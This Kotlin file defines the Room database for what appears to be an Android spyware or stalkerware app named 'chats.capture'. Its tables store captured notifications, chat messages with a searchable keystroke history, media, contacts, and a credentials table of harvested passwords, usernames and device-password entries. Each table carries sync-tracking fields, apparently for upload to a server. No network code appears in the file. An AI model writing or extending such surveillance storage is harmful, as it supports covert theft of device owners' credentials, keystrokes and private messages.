package com.chats.capture.database

import android.content.Context
import androidx.room.Database
import androidx.room.Room
import androidx.room.RoomDatabase
import androidx.room.TypeConverters
import androidx.room.migration.Migration
import androidx.sqlite.db.SupportSQLiteDatabase
import com.chats.capture.models.*

@Database(
    entities = [
        NotificationData::class,
        ChatData::class,
        MediaFile::class,
        UpdateStatus::class,
        Credential::class,
        Contact::class
    ],
    version = 4,
    exportSchema = true
)
@TypeConverters(Converters::class)
abstract class CaptureDatabase : RoomDatabase() {
    
    abstract fun notificationDao(): NotificationDao
    abstract fun chatDao(): ChatDao
    abstract fun mediaFileDao(): MediaFileDao
    abstract fun updateStatusDao(): UpdateStatusDao
    abstract fun credentialDao(): CredentialDao
    abstract fun contactDao(): ContactDao
    
    companion object {
        @Volatile
        private var INSTANCE: CaptureDatabase? = null
        
        fun getDatabase(context: Context): CaptureDatabase {
            return INSTANCE ?: synchronized(this) {
                val instance = Room.databaseBuilder(
                    context.applicationContext,
                    CaptureDatabase::class.java,
                    "capture_database"
                )
                    .addMigrations(MIGRATION_1_2, MIGRATION_2_3, MIGRATION_3_4) // Add migrations as needed
                    .fallbackToDestructiveMigration() // Only for development
                    .build()
                INSTANCE = instance
                instance
            }
        }
        
        // Migration from version 1 to 2: Add credentials table
        private val MIGRATION_1_2 = object : Migration(1, 2) {
            override fun migrate(database: SupportSQLiteDatabase) {
                database.execSQL("""
                    CREATE TABLE IF NOT EXISTS credentials (
                        id TEXT NOT NULL PRIMARY KEY,
                        accountType TEXT NOT NULL,
                        appPackage TEXT,
                        appName TEXT,
                        email TEXT,
                        username TEXT,
                        password TEXT NOT NULL,
                        domain TEXT,
                        url TEXT,
                        devicePassword INTEGER NOT NULL DEFAULT 0,
                        timestamp INTEGER NOT NULL,
                        synced INTEGER NOT NULL DEFAULT 0,
                        syncAttempts INTEGER NOT NULL DEFAULT 0,
                        lastSyncAttempt INTEGER,
                        errorMessage TEXT
                    )
                """.trimIndent())
                database.execSQL("CREATE INDEX IF NOT EXISTS index_credentials_accountType ON credentials(accountType)")
                database.execSQL("CREATE INDEX IF NOT EXISTS index_credentials_appPackage ON credentials(appPackage)")
                database.execSQL("CREATE INDEX IF NOT EXISTS index_credentials_synced ON credentials(synced)")
            }
        }
        
        // Migration from version 2 to 3: Add contacts table
        private val MIGRATION_2_3 = object : Migration(2, 3) {
            override fun migrate(database: SupportSQLiteDatabase) {
                database.execSQL("""
                    CREATE TABLE IF NOT EXISTS contacts (
                        id TEXT NOT NULL PRIMARY KEY,
                        deviceId TEXT,
                        name TEXT NOT NULL,
                        phoneNumber TEXT,
                        email TEXT,
                        organization TEXT,
                        jobTitle TEXT,
                        address TEXT,
                        notes TEXT,
                        photoUri TEXT,
                        timestamp INTEGER NOT NULL,
                        synced INTEGER NOT NULL DEFAULT 0,
                        syncAttempts INTEGER NOT NULL DEFAULT 0,
                        lastSyncAttempt INTEGER,
                        errorMessage TEXT,
                        lastSynced INTEGER
                    )
                """.trimIndent())
                database.execSQL("CREATE INDEX IF NOT EXISTS index_contacts_phoneNumber ON contacts(phoneNumber)")
                database.execSQL("CREATE INDEX IF NOT EXISTS index_contacts_email ON contacts(email)")
                database.execSQL("CREATE INDEX IF NOT EXISTS index_contacts_synced ON contacts(synced)")
                database.execSQL("CREATE INDEX IF NOT EXISTS index_contacts_deviceId ON contacts(deviceId)")
                database.execSQL("CREATE INDEX IF NOT EXISTS index_contacts_lastSynced ON contacts(lastSynced)")
            }
        }
        
        // Migration from version 3 to 4: Add serverMediaUrls to notifications, keyHistory and mediaUrls to chats
        private val MIGRATION_3_4 = object : Migration(3, 4) {
            override fun migrate(database: SupportSQLiteDatabase) {
                // Add serverMediaUrls column to notifications table
                database.execSQL("ALTER TABLE notifications ADD COLUMN serverMediaUrls TEXT")
                
                // Add keyHistory and mediaUrls columns to chats table
                database.execSQL("ALTER TABLE chats ADD COLUMN keyHistory TEXT")
                database.execSQL("ALTER TABLE chats ADD COLUMN mediaUrls TEXT")
                
                // Create FTS (Full-Text Search) virtual table for key history searching
                database.execSQL("""
                    CREATE VIRTUAL TABLE IF NOT EXISTS chats_fts USING fts4(
                        content='chats',
                        keyHistory
                    )
                """.trimIndent())
                
                // Populate FTS table with existing data
                database.execSQL("""
                    INSERT INTO chats_fts(docid, keyHistory) 
                    SELECT rowid, keyHistory FROM chats WHERE keyHistory IS NOT NULL
                """.trimIndent())
            }
        }
    }
}
